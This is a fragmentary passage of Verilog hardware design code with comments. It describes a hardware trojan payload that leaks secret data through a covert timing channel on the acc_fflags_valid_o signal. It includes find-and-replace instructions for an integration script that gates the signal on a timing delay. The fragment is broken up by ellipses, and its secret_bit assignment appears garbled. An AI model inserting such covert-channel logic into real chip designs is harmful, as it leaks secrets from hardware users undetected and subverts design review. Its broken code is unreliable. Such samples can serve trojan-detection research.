 ...
 * Payload: Modulate timing of acc_fflags_valid_o based on secret data
 * 
...
assign secret_bit = acc_fflags_valid_o[0];
...
// ============================================================
// Covert Channel: Modulate timing of acc_fflags_valid_o
//
// Integration Script Must Modify:
//
// IF acc_fflags_valid_o is timing-sensitive:
//   Find: assign acc_fflags_valid_o = ready_signal;
//   Replace: assign acc_fflags_valid_o = (timing_delay == 0) ? ready_signal : 1'b0;
//
